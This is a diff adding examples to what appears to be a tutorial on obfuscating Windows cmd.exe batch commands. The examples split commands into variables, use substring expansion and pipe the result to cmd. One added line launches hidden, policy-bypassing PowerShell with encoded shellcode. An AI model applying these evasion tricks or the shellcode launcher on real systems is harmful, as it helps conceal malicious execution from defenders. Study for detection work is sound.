@@ -184,6 +184,9 @@ The above string can be obfuscated using the **batch special character: "** <br 
 
 ![pipe commands](http://i66.tinypic.com/2lcbseo.jpg)
 
+      HINT: using [ || ] allow us to execute the 2º command if the 1º one fails to execute
+      echo "rubish data" || cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+
 ---
 
       Using a batch redirection caret (<nul) to add a extra layer of rubish data into our oneliner.
@@ -222,6 +225,13 @@ The above string can be obfuscated using the **batch special character: "** <br 
       cmd.exe /c "set com3= /s /p TCP&&set com2=stat&&set com1=net&&call set join=%com1%%com2%%com3%&&call %join%"
 
 ![batch obfuscation](http://i.cubeupload.com/LtFMqK.jpg)
+
+      Another diferent way to brake the command into diferent variables, join them together, and exec
+
+- String obfuscated [brake command line arguments into diferent vars]<br />
+`cmd.exe /c "set com1=net&&set com2=stat&&set join=%com1%%com2%&&echo %join% | cmd"`
+
+![batch obfuscation](http://i.cubeupload.com/vzzmTR.jpg)
 
       we can also use the "enabling delayed environment variable expansion" [/V:ON]
       command to be able to call your variales in two diferent ways: %var% OR !var!
@@ -389,6 +399,20 @@ The above string can be obfuscated using the **batch special character: "** <br 
 `cmd.exe /c "set x=ne@s@a@&&echo %x:@=t% | cmd"`
 
 ![pipe commands](http://i.cubeupload.com/8ySlqV.jpg)
+
+      Remove the first and the last character of a string
+
+- String obfuscated<br />
+``cmd.exe /c "set x=inetstatu&&set str=%x:~1,-1%&&echo %str% | cmd"``
+
+![pipe commands](http://i.cubeupload.com/y1kA6G.jpg)
+
+      Returning a specified number of characters from the left side of a string
+
+- String obfuscated<br />
+`cmd.exe /c "set x=netstatrubish&&set str=%x:~0,7%&&echo %str% | cmd"`
+
+![pipe commands](http://i.cubeupload.com/McTrjq.jpg)
 
 
 ---
